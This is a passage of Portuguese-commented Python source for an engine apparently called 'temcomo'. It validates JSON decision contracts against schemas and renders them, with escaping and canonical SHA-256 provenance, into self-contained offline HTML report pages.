            erros.append(f"$.direcoes: no máximo 1 direção fora da caixa, vieram {len(marcadas)}")
        reais = len(direcoes) - len(marcadas)
        if reais > 4:
            erros.append(f"$.direcoes: no máximo 4 direções reais, vieram {reais} — a de fora "
                         f"da caixa não conta, e nenhuma pode ser inventada para preencher cota")
        recomendadas = [d for d in direcoes if isinstance(d, dict) and d.get("recomendada") is True]
        if len(recomendadas) != 1:
            erros.append(f"$.direcoes: exatamente 1 direção recomendada, vieram {len(recomendadas)}")
        recomendacao = dado.get("recomendacao")
        if isinstance(recomendacao, dict):
            escolhida = recomendacao.get("direcao_id")
            identificadores = [d.get("id") for d in direcoes if isinstance(d, dict)]
            if escolhida not in identificadores:
                erros.append(f"$.recomendacao.direcao_id: {_resumo(escolhida, 40)} não é o "
                             f"identificador de nenhuma direção da lista")
            elif recomendadas and recomendadas[0].get("id") != escolhida:
                erros.append(f"$.recomendacao.direcao_id: aponta para {_resumo(escolhida, 40)}, "
                             f"mas a direção marcada como recomendada é "
                             f"{_resumo(recomendadas[0].get('id'), 40)}")

    if versao == "grill-rodada-v1" and isinstance(dado.get("perguntas"), list):
        perguntas = dado["perguntas"]
        erros += _ids_unicos(perguntas, "$.perguntas")
        for i, pergunta in enumerate(perguntas):
            if not isinstance(pergunta, dict):
                continue
            base = f"$.perguntas[{i}]"
            if pergunta.get("reversivel") is False and _em_branco(pergunta.get("irreversivel_aviso")):
                erros.append(f"{base}.irreversivel_aviso: obrigatório quando a decisão é "
                             f"difícil de voltar atrás — o aviso precisa estar escrito no contrato")
            opcoes = pergunta.get("opcoes")
            if not isinstance(opcoes, list):
                continue
            erros += _ids_unicos(opcoes, f"{base}.opcoes")
            recomendadas = [o for o in opcoes if isinstance(o, dict) and o.get("recomendada") is True]
            if len(recomendadas) != 1:
                erros.append(f"{base}.opcoes: exatamente 1 opção recomendada, "
                             f"vieram {len(recomendadas)}")
            marcadas = [o for o in opcoes if isinstance(o, dict) and o.get("fora_da_caixa") is True]
            if len(marcadas) > 1:
                erros.append(f"{base}.opcoes: no máximo 1 opção fora da caixa, "
                             f"vieram {len(marcadas)}")
            if len(opcoes) - len(marcadas) > 4:
                erros.append(f"{base}.opcoes: no máximo 4 opções reais, "
                             f"vieram {len(opcoes) - len(marcadas)}")

    if versao == "tarefa-v1":
        erros += erros_de_coerencia_da_jornada(dado)

    if isinstance(dado.get("anotacoes"), list):
        erros += _ids_unicos(dado["anotacoes"], "$.anotacoes")
    return erros

def validar_documento_carregado(dado, origem: str) -> dict:
    """Resolve a versão do contrato, valida envelope + corpo + regras extras.
    Fail-closed: qualquer problema bloqueia com a lista inteira de motivos."""
    if not isinstance(dado, dict):
        fail(f"'{citar(origem)}': o contrato precisa ser um objeto JSON, "
             f"veio {nome_do_tipo(dado)}")
    versao = dado.get("schema_version")
    if not isinstance(versao, str) or not versao:
        fail(f"'{citar(origem)}': falta 'schema_version' — sem ela não há como saber que "
             f"contrato é este (conhecidos: {', '.join(repr(v) for v in VERSOES_DE_CONTRATO)})")
    if versao not in SCHEMAS:
        fail(f"'{citar(origem)}': versão de contrato desconhecida '{_resumo(versao, 40)}'"
             f"{_sugestao(versao, SCHEMAS)} — conhecidas: "
             f"{', '.join(repr(v) for v in VERSOES_DE_CONTRATO)}")

    definicao = carregar_schema(versao)
    erros = validar_contra_schema(dado, ENVELOPE_COMUM)
    for erro in validar_contra_schema(dado, definicao):
        if erro not in erros:
            erros.append(erro)
    erros += erros_de_texto_em_branco(dado, definicao)
    # Rede de segurança: as regras extras leem campos que a definição pode já ter
    # reprovado. Elas são defensivas, mas um documento inválido nunca pode virar
    # traceback em inglês na cara do usuário — na dúvida, o gate bloqueia e explica.
    try:
        erros += regras_extras(dado)
    except Exception:
        erros.append("$: não consegui aplicar as regras do contrato porque o documento tem "
                     "valores em tipos inesperados — corrija os problemas acima e rode de novo")
    if erros:
        fail(f"'{citar(origem)}' não passou na conferência do contrato '{_resumo(versao, 40)}':\n  - "
             + "\n  - ".join(erros))
    return dado

def carregar_e_validar(caminho) -> dict:
    """Lê o arquivo, resolve o contrato pela `schema_version` e valida tudo."""
    return validar_documento_carregado(ler_json(caminho), str(caminho))

def cmd_validar(args):
    dado = carregar_e_validar(args.contrato)
    print(f"OK — '{args.contrato}' é um contrato '{dado['schema_version']}' válido")

# ————— renderização dos relatórios (spec §8 e §10) —————

PASTA_DE_TEMPLATES = PASTA_DO_MOTOR / "templates"
PASTA_DE_ASSETS = PASTA_DO_MOTOR / "assets"
_CACHE_DE_ARQUIVOS = {}

def ler_recurso(caminho) -> str:
    """Lê (uma vez) um arquivo do próprio motor: template ou ativo de identidade."""
    caminho = Path(caminho)
    if caminho not in _CACHE_DE_ARQUIVOS:
        if not caminho.exists():
            fail(f"falta um arquivo do próprio motor: '{citar(caminho)}' — a instalação do temcomo "
                 f"está incompleta")
        _CACHE_DE_ARQUIVOS[caminho] = caminho.read_text(encoding="utf-8")
    return _CACHE_DE_ARQUIVOS[caminho]

def sha_do_contrato(contrato: dict) -> str:
    """SHA-256 da FORMA CANÔNICA do contrato — a proveniência do artefato.

    Não é o hash dos bytes do arquivo de entrada: dois arquivos com as mesmas chaves em
    ordem diferente descrevem o mesmo contrato e têm de gerar a mesma página, então o
    hash é o do conteúdo normalizado por `texto_do_contrato`. Quem conferir com
    `shasum contrato.json` vai achar outro valor — por isso a página diz qual é qual.
    (auditoria cega, P3/item 6)"""
    return hashlib.sha256(texto_do_contrato(contrato).encode("utf-8")).hexdigest()

def texto_do_contrato(contrato: dict) -> str:
    """Serialização canônica: mesmo contrato, mesmos bytes, sempre."""
    return json.dumps(contrato, ensure_ascii=False, indent=2, sort_keys=True)

def esc(valor) -> str:
    """Todo dado do contrato entra na página escapado — o contrato é dado, não markup."""
    return html.escape(str(valor), quote=True)

class LeitorDeProsa(HTMLParser):
    """Separa o que o motor escreve do que veio do contrato. Ignora `<script>`,
    `<style>`, `<title>` e tudo dentro de um `<span data-origem-contrato>` — o resto
    é prosa estrutural e precisa estar no inventário auditado (achado r3/2)."""

    IGNORADAS = ("script", "style", "title")

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.estruturais = []
        self._mudas = 0
        self._do_contrato = 0

    def handle_starttag(self, tag, atributos):
        if tag in self.IGNORADAS:
            self._mudas += 1
        elif tag == "span" and any(nome == "data-origem-contrato" for nome, _ in atributos):
            self._do_contrato += 1

    def handle_endtag(self, tag):
        if tag in self.IGNORADAS and self._mudas:
            self._mudas -= 1
        elif tag == "span" and self._do_contrato:
            self._do_contrato -= 1

    def handle_data(self, texto):
        if self._mudas or self._do_contrato:
            return
        limpo = " ".join(texto.split())
        if limpo:
            self.estruturais.append(limpo)

def prosa_estrutural(pagina: str) -> set:
    """Todos os nós de texto que o motor escreve na página, já normalizados."""
    leitor = LeitorDeProsa()
    leitor.feed(pagina)
    return set(leitor.estruturais)

def do_contrato(valor) -> str:
    """Marca, no próprio HTML, um pedaço de texto que veio do contrato. É o que permite
    ao gate de prosa separar o que o MOTOR escreve do que o AUTOR escreveu, mesmo quando
    os dois se misturam na mesma frase (achado r3/2)."""
    return f"<span data-origem-contrato>{esc(valor)}</span>"

def bloco_de_export(contrato: dict, versao_do_export: str, apelido: str) -> dict:
    """Nomes de chave e de arquivo calculados pelo motor, não copiados do contrato:
    é o que mantém o namespace 'temcomo:' e encerra a divergência entre as páginas
    (`chave_localstorage`/`nome_arquivo` valem para direções e para grill)."""
    tarefa_id = contrato["tarefa_id"]
    data = str(contrato.get("gerado_em", ""))[:10]
    return {"schema_version": versao_do_export,
            "chave_localstorage": f"temcomo:{tarefa_id}:{apelido}",
            "nome_arquivo": f"{versao_do_export}__tarefa-{tarefa_id}__data-{data}.json"}

def faixa_de_exemplo(contrato: dict) -> str:
    """A tarja de dados de exemplo só existe quando o contrato se declara exemplo."""
    if not (contrato.get("exemplo") is True or contrato.get("prototipo") is True):
        return ""
    aviso = contrato.get("aviso_prototipo") or ("PROTÓTIPO — dados de exemplo; o conteúdo real "
                                                "vem do motor temcomo")
    corpo = do_contrato(aviso)
    marcado = f"<span data-origem-contrato>{esc(aviso)}"
    if esc(aviso).startswith("PROTÓTIPO"):   # destaca a primeira palavra, como no aprovado
        marcado = ("<span data-origem-contrato><strong>PROTÓTIPO</strong>"
                   + esc(aviso)[len("PROTÓTIPO"):])
    corpo = marcado + "</span>"
    return ('<div class="notice-strip" role="note"><span class="dot" aria-hidden="true"></span>'
            f"{corpo}</div>")

CHEVRON = ('<svg class="chev" viewBox="0 0 16 16" aria-hidden="true">'
           '<path d="M6 3l5 5-5 5" fill="none" stroke="currentColor" stroke-width="2" '
           'stroke-linecap="round" stroke-linejoin="round"/></svg>')
ORIGEM_LEIGA = {"construir": "Construir", "reuso": "Reusar", "misto": "Reuso + construção"}

def _botao_de_anotacao(bloco: str) -> str:
    return ('<button type="button" class="annot-block-btn" data-bloco="%s" '
            'aria-label="Anotar este bloco inteiro"></button>' % esc(bloco))

def _criterios_em_html(contrato: dict) -> str:
    linhas = []
    for criterio in contrato.get("criterios", []):
        peso = '<span class="tag-peso%s">peso %s</span>' % (
            " alto" if criterio.get("peso") == "alto" else "", do_contrato(criterio.get("peso", "")))
        sempre = ('<span class="tag-sempre">sempre presente</span>'
                  if criterio.get("sempre_presente") else "")
        linhas.append(
            '      <div class="crit-item"><div class="crit-name"><span>%s</span>%s%s</div>'
            '<p class="crit-q">%s</p></div>'
            % (do_contrato(criterio.get("nome", "")), peso, sempre,
               do_contrato(criterio.get("pergunta_leiga", ""))))
    return "\n".join(linhas)

def _linhas_da_tabela(contrato: dict) -> str:
    linhas = []
    for i, direcao in enumerate(contrato.get("direcoes", [])):
        classe = "dir-row"
        if direcao.get("recomendada"):
            classe += " is-reco"
        if direcao.get("fora_da_caixa"):
            classe += " is-fdc"
        selos = []
        if direcao.get("recomendada"):
            selos.append('<span class="badge-reco">Recomendado</span>')
        if direcao.get("fora_da_caixa"):
            selos.append('<span class="badge-fdc">Fora da caixa</span>')
        selos_html = ('<div class="t-badges">%s</div>' % "".join(selos)) if selos else ""
        aderencia = direcao.get("aderencia", 0)
        aderencia = int(aderencia) if isinstance(aderencia, (int, float)) else 0
        letra = direcao.get("letra") or chr(ord("A") + i)
        linhas.append(
            '            <tr class="%s" data-dir-id="%s">\n'
            '              <td class="t-dir"><div class="t-dir-inner"><span class="letter-pill">%s</span><div>\n'
            '                <button type="button" class="row-open" data-dir-id="%s" aria-haspopup="dialog">%s%s</button>\n'
            '                %s\n'
            '                %s\n'
            '              </div></div></td>\n'
            '              <td class="td-custo">%s%s</td>\n'
            '              <td class="td-adr"><div class="adr"><span class="adr-num">%s</span><div class="adr-bar"><span style="width:%d%%"></span></div></div></td>\n'
            '              <td class="t-limit">%s</td>\n'
            '              <td class="td-escolha"><button type="button" class="btn-choose" data-dir-id="%s" data-source="tabela" aria-pressed="false">Escolher</button><span class="row-annot" data-count="0" hidden></span></td>\n'
            '            </tr>' % (
                classe, esc(direcao.get("id", "")), do_contrato(letra),
                esc(direcao.get("id", "")), do_contrato(direcao.get("nome", "")), CHEVRON,
                bloco_com_conteudo('<div class="row-resumo" data-opcional="direcoes.[].resumo">%s</div>',
                                   direcao.get("resumo")), selos_html,
                do_contrato(direcao.get("custo", "")),
                bloco_com_conteudo('<span class="custo-curto" data-opcional="direcoes.[].custo_curto">%s</span>',
                                   direcao.get("custo_curto")),
                do_contrato(aderencia), aderencia,
                do_contrato(direcao.get("limite_principal", "")),
                esc(direcao.get("id", ""))))
    return "\n".join(linhas)

def _cartoes_das_direcoes(contrato: dict) -> str:
    cartoes = []
    criterios = contrato.get("criterios", [])
    for i, direcao in enumerate(contrato.get("direcoes", [])):
        identificador = direcao.get("id", "")
        classe = "dir-doc" + (" is-fdc" if direcao.get("fora_da_caixa") else "")
        selos = []
        if direcao.get("recomendada"):
            selos.append('<span class="badge-reco">Recomendado</span>')
        if direcao.get("fora_da_caixa"):
            selos.append('<span class="badge-fdc">Fora da caixa</span>')

        campos = []
        for rotulo, valor, nota in (
                ("Origem", ORIGEM_LEIGA.get(direcao.get("origem"), direcao.get("origem", "")), None),
                ("Custo", direcao.get("custo", ""), direcao.get("custo_leigo")),
                ("Complexidade", direcao.get("complexidade", ""), None),
                ("Aderência", "%s de 100" % direcao.get("aderencia", ""), None)):
            nota_html = ('<div class="mf-note">%s</div>' % do_contrato(nota)) if nota else ""
            campos.append('<div class="meta-field"><div class="mf-label">%s</div>'
                          '<div class="mf-value">%s</div>%s</div>'
                          % (esc(rotulo), do_contrato(valor), nota_html))

        notas = []
        pontuacao = direcao.get("pontuacao") or {}
        for criterio in criterios:
            valor = pontuacao.get(criterio.get("id"))
            if not isinstance(valor, int) or isinstance(valor, bool):
                continue
            bolinhas = "".join('<span%s></span>' % (' class="on"' if n <= valor else "")
                               for n in range(1, 6))
            notas.append('<div class="score-row"><span class="sc-name">%s</span>'
                         '<div class="score-dots" role="img" aria-label="%s: %d de 5">%s</div>'
                         '<span class="sc-val">%s/5</span></div>'
                         % (do_contrato(criterio.get("nome", "")), esc(criterio.get("nome", "")),
                            valor, bolinhas, do_contrato(valor)))

        consequencias = direcao.get("consequencias") or {}
        ganha = "".join("<li>%s</li>" % do_contrato(x) for x in consequencias.get("ganha", []))
        troca = "".join("<li>%s</li>" % do_contrato(x)
                        for x in consequencias.get("aceita_perder", []))

        nota_reco = ""
        if direcao.get("recomendada"):
            justificativa = (contrato.get("recomendacao") or {}).get("justificativa", "")
            nota_reco = ('\n    <div class="reco-note" data-anotavel="reco-justificativa" '
                         'data-item="%s"><strong>Por que este é o recomendado</strong>'
                         '<span>%s</span>%s</div>'
                         % (esc(identificador), do_contrato(justificativa),
                            _botao_de_anotacao("reco-justificativa")))

        cartoes.append('''  <article class="%(cls)s" id="doc-%(id)s" data-dir-id="%(id)s" hidden="until-found" aria-labelledby="doc-t-%(id)s">
  <header class="doc-head">
    <div class="dir-title"><span class="letter-pill">%(letra)s</span><div>
      <h3 id="doc-t-%(id)s">%(nome)s</h3>
      %(origem_leiga)s
    </div></div>
%(bloco_badges)s    <div class="doc-head-actions"><button type="button" class="btn-choose btn-choose-doc" data-dir-id="%(id)s" data-source="documento" aria-pressed="false">Escolher este caminho</button></div>
  </header>
  <div class="doc-body" id="body-%(id)s">
    <div class="block-label">Em palavras simples</div>
    <p class="dir-explica" data-anotavel="%(id)s-explicacao" data-item="%(id)s">%(explica)s%(btn_explica)s</p>
    <div class="dir-meta">%(meta)s</div>
    <div class="limit-box" data-anotavel="%(id)s-limite" data-item="%(id)s"><strong>Limite principal</strong><span>%(limite)s</span>%(btn_limite)s</div>
%(bloco_scores)s    <div class="block-label">Se você escolher este caminho</div>
    <div class="cons-grid">
      <div class="cons-box ok" data-anotavel="%(id)s-ganha" data-item="%(id)s"><h4>Você ganha</h4><ul>%(ganha)s</ul>%(btn_ganha)s</div>
      <div class="cons-box warn" data-anotavel="%(id)s-troca" data-item="%(id)s"><h4>Você aceita, em troca</h4><ul>%(troca)s</ul>%(btn_troca)s</div>
    </div>
%(bloco_fatos)s%(vs_bloco)s%(reco_note)s
  </div>
</article>''' % {
            "cls": classe, "id": esc(identificador),
            "letra": do_contrato(direcao.get("letra") or chr(ord("A") + i)),
            "nome": do_contrato(direcao.get("nome", "")),
            "origem_leiga": bloco_com_conteudo('<div class="dir-origin" data-opcional="direcoes.[].origem_leiga">%s</div>',
                                  direcao.get("origem_leiga")),
            # sem `data-opcional`: os selos não vêm de UM campo opcional, e sim de
            # `recomendada`/`fora_da_caixa` juntos — quem cobre o caso vazio é o
            # detector de contêiner oco, que foi o que o achou na primeira vez
            "bloco_badges": ("    <div class=\"card-badges\">%s</div>\n" % "".join(selos))
                             if "".join(selos) else "",
            "explica": do_contrato(direcao.get("explicacao_leiga", "")),
            "btn_explica": _botao_de_anotacao(identificador + "-explicacao"),
            "meta": "".join(campos),
            "limite": do_contrato(direcao.get("limite_principal", "")),
            "btn_limite": _botao_de_anotacao(identificador + "-limite"),
            # rótulo e caixa só existem quando há nota para mostrar; o contêiner dos
            # fatos some junto com os dois filhos (r2/P3: `pontuacao` era o quarto irmão,
            # e `cons-facts` ficava oco quando prazo e primeiro passo faltavam)
            "bloco_scores": ('    <div class="block-label" data-opcional='
                             '"direcoes.[].pontuacao">Como pontua nos critérios (0 a 5)'
                             '</div>\n    <div class="scores" data-opcional='
                             '"direcoes.[].pontuacao">%s</div>\n'
                             % "".join(notas)) if notas else "",
            "ganha": ganha, "btn_ganha": _botao_de_anotacao(identificador + "-ganha"),
            "troca": troca, "btn_troca": _botao_de_anotacao(identificador + "-troca"),
            "bloco_fatos": _fatos_da_consequencia(consequencias),
            "vs_bloco": bloco_com_conteudo(
                '    <div class="vs-note" data-opcional='
                '"direcoes.[].consequencias.vs_recomendada" data-anotavel="'
                + esc(identificador) + '-vs" '
                'data-item="' + esc(identificador) + '"><strong>Comparado com o caminho '
                'recomendado</strong><span>%s</span>'
                + _botao_de_anotacao(identificador + "-vs") + '</div>',
                consequencias.get("vs_recomendada")),
            "reco_note": nota_reco,
        })
    return "\n".join(cartoes)

def _fatos_da_consequencia(consequencias: dict) -> str:
    """A faixa de fatos e seus dois cartões. O pai some junto com os filhos — caixa com
    borda e nada dentro é o motor afirmando o que o contrato não disse (r2/P3)."""
    fatos = (bloco_com_conteudo('<div class="cons-fact" data-opcional='
                                '"direcoes.[].consequencias.prazo"><div class="cf-label">'
                                'Prazo estimado</div><div class="cf-value">%s</div></div>',
                                consequencias.get("prazo"))
             + bloco_com_conteudo('<div class="cons-fact" data-opcional='
                                  '"direcoes.[].consequencias.primeiro_passo">'
                                  '<div class="cf-label">Primeiro passo depois da escolha'
                                  '</div><div class="cf-value">%s</div></div>',
                                  consequencias.get("primeiro_passo")))
    return f'    <div class="cons-facts">{fatos}</div>\n' if fatos else ""

def bloco_com_conteudo(molde: str, valor) -> str:
    """Emite a estrutura só quando há o que pôr dentro dela.

    Caixa com rótulo e nada escrito é o motor afirmando que existe uma informação que o
    contrato não deu — a mesma classe da decisão 19, agora na forma de espaço em branco
    com borda. (auditoria cega, P3/item 5)"""
    return "" if _em_branco(valor) else molde % do_contrato(valor)

def letra_da_direcao(direcoes: list, direcao: dict) -> str:
    """Rótulo A/B/C de um caminho: o que o contrato declarou ou, na falta, a posição.

    Derivar é apresentação; gravar no documento seria inventar dado (decisão 19)."""
    if direcao.get("letra"):
        return direcao["letra"]
    try:
        return chr(ord("A") + direcoes.index(direcao))
    except ValueError:
        return ""

def limite_de_texto(schema_id: str, *caminho) -> int:
    """O `maxLength` que a definição impõe a um campo do export.

    A página tem de recusar na digitação o que o motor recusaria na validação — senão o
    usuário escreve, a página aceita e o `validar` reprova depois. O número sai daqui, da
    definição: repetido à mão no template, ele envelhece calado no dia em que o schema
    mudar. Percorre `properties` por nome e `items` por `[]`."""
    no = carregar_schema(schema_id)
    for passo in caminho:
        if isinstance(passo, list):
            no = no.get("items") or {}
        else:
            no = (no.get("properties") or {}).get(passo) or {}
    limite = no.get("maxLength")
    if not isinstance(limite, int):
        raise KeyError(f"a definição '{schema_id}' não impõe maxLength em "
                       f"{'.'.join(str(p) for p in caminho)}")
    return limite

def render_direcoes(contrato: dict) -> str:
    """Monta o relatório de direções a partir do contrato `direcoes-v1`.

    Determinístico por construção: nada de relógio nem de aleatório aqui — o que
    aparece na página vem do contrato, e a identidade vem dos ativos versionados."""
    sha = sha_do_contrato(contrato)     # proveniência: o contrato como ele entrou
    documento = json.loads(json.dumps(contrato))          # não mexe no que recebeu
    documento["export"] = bloco_de_export(documento, "decisao-direcoes-v1", "decisao-direcoes")
    # A letra é rótulo de apresentação, não dado do contrato: quando o autor não declara,
    # HTML e JavaScript a derivam da posição, cada um no seu lado. Gravá-la aqui era o
    # motor pondo no documento uma informação que ninguém deu — a classe da decisão 19.
    # (auditoria cega, P2/item 4)
    # `<\/` é escape válido de `/` em JSON: o texto volta igual no `JSON.parse`, e nenhum
    # dado do contrato consegue fechar a tag <script> que o embrulha.
    corpo = texto_do_contrato(documento).replace("</", "<\\/")

    # Decisão 19 (2026-08-21): `etapa` é opcional no contrato, e a página nunca
    # afirma o que o formulário não disse — sem etapa declarada, a linha simplesmente
    # não aparece. Inventar "Etapa 3 de 4 · Propor direções" era o motor falando pelo
    # autor (e era, literalmente, o texto da tarefa que serviu de semente).
    etapa = documento.get("etapa") or {}
    numero, total, nome_da_etapa = etapa.get("numero"), etapa.get("total"), etapa.get("nome")
    partes_da_etapa = []
    if numero is not None and total is not None:
        partes_da_etapa.append(f"Etapa {do_contrato(numero)} de {do_contrato(total)}")
    if not _em_branco(nome_da_etapa):
        partes_da_etapa.append(do_contrato(nome_da_etapa))

    rdate = "temcomo"
    if partes_da_etapa:
        rdate += " · %s" % " — ".join(partes_da_etapa)
    if documento.get("gerado_em"):
        rdate += " · gerado em %s" % do_contrato(str(documento["gerado_em"])[:10])
    eyebrow = (" · ".join(partes_da_etapa) + " — você decide aqui" if partes_da_etapa
               else "Você decide aqui")

    direcoes = documento.get("direcoes", [])
    quantos = len(direcoes)
    caminhos = "1 caminho" if quantos == 1 else f"{quantos} caminhos"
    recomendada = next((d for d in direcoes
                        if d.get("id") == (documento.get("recomendacao") or {}).get("direcao_id")),
                       None)
    sem_escolha = "Nenhum caminho escolhido ainda."
    if recomendada:
        sem_escolha += (f" A recomendação ({do_contrato(letra_da_direcao(direcoes, recomendada))}) "
                        f"está destacada na tabela — aceitar custa um clique em “Escolher”.")
    rodape = (f'<p class="foot-note">Página gerada pelo motor temcomo (versão {ENGINE_VERSION}) '
              f"a partir do contrato '{do_contrato(documento.get('tarefa_id', ''))}'. Ela funciona "
              f"offline, "
              f"não faz nenhum acesso externo e não executa nenhuma ação: a decisão só sai daqui "
              f"pelos botões de copiar ou baixar — e só vale como escolha depois de uma ação sua "
              f'(o estado “pendente” é explícito).</p>\n'
              f'        <div class="mono">Contrato: {do_contrato(documento["export"]["schema_version"])} '
              f"· SHA-256 do contrato em forma canônica, com as chaves ordenadas: "
              f"{do_contrato(sha)}</div>\n"
              f'        <div class="mono">Identidade QualiApps embutida: tipografia e logotipo '
              f"viajam dentro do arquivo, para a página abrir sem internet.</div>")

    valores = {
        "%%TOKENS%%": ler_recurso(PASTA_DE_ASSETS / "tokens.css"),
        "%%FONTS%%": ler_recurso(PASTA_DE_ASSETS / "fontes.css"),
        "%%LOGO_SRC%%": ler_recurso(PASTA_DE_ASSETS / "logo-qualiapps.txt").strip(),
        "%%PROVENIENCIA%%": f"<!-- temcomo engine v{ENGINE_VERSION} · contrato sha256 {sha} -->",
        "%%CONTRATO_SHA%%": sha,
        "%%MAX_COMENTARIO%%": str(limite_de_texto("decisao-direcoes-v1", "comentario")),
        # cada campo carrega o limite do SEU caminho no schema: um número só para
        # caminhos independentes desfaz a proteção contra drift (r2/P2)
        "%%LIMITES_DE_TEXTO%%": json.dumps({
            "comentario": limite_de_texto("decisao-direcoes-v1", "comentario"),
            "anotacao": limite_de_texto("decisao-direcoes-v1", "anotacoes", [], "comentario"),
        }, ensure_ascii=False, sort_keys=True),
        "%%MAX_ANOTACAO%%": str(limite_de_texto("decisao-direcoes-v1",
                                                "anotacoes", [], "comentario")),
        "%%CONTRATO_JSON%%": corpo,
        "%%PERGUNTA_TITULO%%": esc(documento.get("pergunta_original", "")),
        "%%PERGUNTA%%": do_contrato(documento.get("pergunta_original", "")),
        "%%OBJETIVO%%": do_contrato(documento.get("objetivo_leigo", "")),
        "%%TAREFA_ID%%": esc(documento.get("tarefa_id", "")),
        "%%SCHEMA_EXPORT%%": esc(documento["export"]["schema_version"]),
        "%%RID%%": "%s · %s" % (do_contrato(documento.get("tarefa_id", "")),
                                do_contrato(documento["export"]["schema_version"])),
        "%%RDATE%%": rdate,
        "%%EYEBROW%%": eyebrow,
        "%%HERO_INSTRUCAO%%": (f"Tem como, sim — por <strong>{do_contrato(caminhos)}</strong>. Compare "
                               f"na tabela, toque num caminho para os detalhes; <strong>nada é "
                               f"construído antes de você decidir</strong>."),
        "%%CAMINHOS%%": do_contrato(caminhos),
        "%%COMPARE_TITULO%%": (f"Os {do_contrato(caminhos)}, lado a lado"
                               if quantos != 1 else "O caminho proposto"),
        "%%DOC_TITULO%%": (f"Os {do_contrato(caminhos)} em detalhe"
                           if quantos != 1 else "O caminho em detalhe"),
        "%%TEXTO_SEM_ESCOLHA%%": sem_escolha,
        "%%RODAPE%%": rodape,
        "%%FAIXA_EXEMPLO%%": faixa_de_exemplo(documento),
        "%%CRITERIA%%": _criterios_em_html(documento),
        "%%ROWS%%": _linhas_da_tabela(documento),
        "%%ARTICLES%%": _cartoes_das_direcoes(documento),
    }
    pagina = ler_recurso(PASTA_DE_TEMPLATES / "direcoes.html.tpl")
    for marca, valor in valores.items():
        pagina = pagina.replace(marca, valor)
    sobrando = re.findall(r"%%[A-Z_]+%%", pagina)
    if sobrando:
        fail(f"o template ficou com marcação sem preencher: {', '.join(sorted(set(sobrando)))}")
    return pagina

# ————— rodada de grill (spec §8) —————

CHEVRON_GRILL = ('<svg class="chev" viewBox="0 0 24 24" aria-hidden="true">'
                 '<path d="M9 6l6 6-6 6" stroke-linecap="round" stroke-linejoin="round"/></svg>')
BALAO = ('<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 '
         '2 0 0 1 2-2h14a2 2 0 0 1 2 2z" stroke-linecap="round" stroke-linejoin="round"/></svg>')
TRIANGULO = ('<svg viewBox="0 0 24 24" aria-hidden="true">'
             '<path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 '
             '2 0 0 0-3.42 0z" stroke-linecap="round" stroke-linejoin="round"/>'
             '<line x1="12" y1="9" x2="12" y2="13" stroke-linecap="round"/>'
             '<line x1="12" y1="17" x2="12.01" y2="17" stroke-linecap="round"/></svg>')
ROTULO_DO_BOTAO = {"aprovar": "Aprovar", "rejeitar": "Rejeitar",
                   "duvida": "Fiquei com dúvida", "adiar": "Adiar"}
AJUDA_PENDENTE = ("Falta responder: esta pergunta sai no arquivo como pendente, "
                  "e o conferente devolve a rodada apontando o que faltou.")
# Fallback do plano (Task 6): quando o contrato não escreve o aviso, o motor escreve.
AVISO_IRREVERSIVEL_PADRAO = ("Difícil voltar atrás: esta decisão não tem como ser desfeita "
                             "depois — escolha com calma.")

def _opcao_em_html(pergunta: dict, opcao: dict, pergunta_indice: int, opcao_indice: int) -> str:
    recomendada = opcao.get("recomendada") is True
    fora_da_caixa = opcao.get("fora_da_caixa") is True
    selos = ""
    if recomendada:
        selos += '<span class="opt-badge b-recomendada">Recomendada</span>'
    if fora_da_caixa:
        selos += '<span class="opt-badge b-fora">✦ Fora da caixa</span>'
    classe = ("option" + (" fora-da-caixa" if fora_da_caixa else "")
              + (" selected" if recomendada else ""))
    opcao_id = esc(opcao.get("id", ""))
    id_interno = f"q{pergunta_indice + 1}-o{opcao_indice + 1}"
    return f'''<label class="{classe}" data-opcao-id="{opcao_id}">
<input type="radio" name="escolha-q{pergunta_indice + 1}" value="{opcao_id}" id="escolha-{id_interno}"{" checked" if recomendada else ""}>
<span class="opt-body">
<span class="opt-title">{do_contrato(opcao.get("titulo", ""))}{selos}</span>
<span class="opt-detail">{do_contrato(opcao.get("detalhe", ""))}</span>
<span class="opt-cons">
<span class="cons-box cons-ganha"><span class="cons-h">Se você escolher esta, ganha</span>{do_contrato(opcao.get("ganha", ""))}</span>
<span class="cons-box cons-abre"><span class="cons-h">E abre mão de</span>{do_contrato(opcao.get("abre_mao", ""))}</span>
</span>
</span>
</label>'''

def _pergunta_em_html(pergunta: dict, indice: int, rodada) -> str:
    identificador = esc(pergunta.get("id", ""))
    id_interno = f"q{indice + 1}"
    # o campo não deixa escrever o que o motor recusaria depois (auditoria cega, P1)
    limite_duvida = limite_de_texto("grill-respostas-v1", "respostas", [], "duvida_texto")
    bloco_contexto = bloco_com_conteudo(
        '<div class="wz-block" data-opcional="perguntas.[].contexto">\n'
        '<div class="block-label">Por que estou te perguntando isso'
        '</div>\n<p class="card-context" data-anotavel data-bloco-id="'
        + identificador + '::contexto">%s</p>\n</div>', pergunta.get("contexto"))
    bloco_origem = bloco_com_conteudo(
        '<p data-opcional="perguntas.[].origem" data-anotavel data-bloco-id="'
        + identificador + '::origem">%s</p>\n', pergunta.get("origem"))
    limite_comentario = limite_de_texto("grill-respostas-v1", "respostas", [], "comentario")
    opcoes = pergunta.get("opcoes") or []
    recomendada = next((o for o in opcoes if o.get("recomendada")), opcoes[0] if opcoes else {})
    reversivel = pergunta.get("reversivel") is not False
    if reversivel:
        linha_rev = '<span class="q-rev">dá para mudar depois</span>'
        nota_rev = ('<p class="rev-note">Dá para mudar depois: esta escolha pode ser revista '
                    'numa rodada futura sem prejuízo.</p>')
        callout = ""
    else:
        linha_rev = '<span class="q-rev irrev">difícil voltar atrás</span>'
        nota_rev = ""
        aviso = pergunta.get("irreversivel_aviso")
        if _em_branco(aviso):
            aviso = AVISO_IRREVERSIVEL_PADRAO      # fallback do plano (Task 6)
        callout = ('\n<div class="irrev-callout" role="note" aria-label="Atenção: difícil '
                   f'voltar atrás">{TRIANGULO}<span>{do_contrato(aviso)}</span></div>')
    selo_inicio = '<span class="q-start-badge">Comece por aqui</span>' if indice == 0 else ""
    botoes = "".join(
        f'<button type="button" class="state-btn b-{esc(b)}" data-botao="{esc(b)}" '
        f'aria-pressed="false" aria-describedby="help-{id_interno}">'
        f'{esc(ROTULO_DO_BOTAO.get(b, b))}</button>'
        for b in pergunta.get("botoes", []))
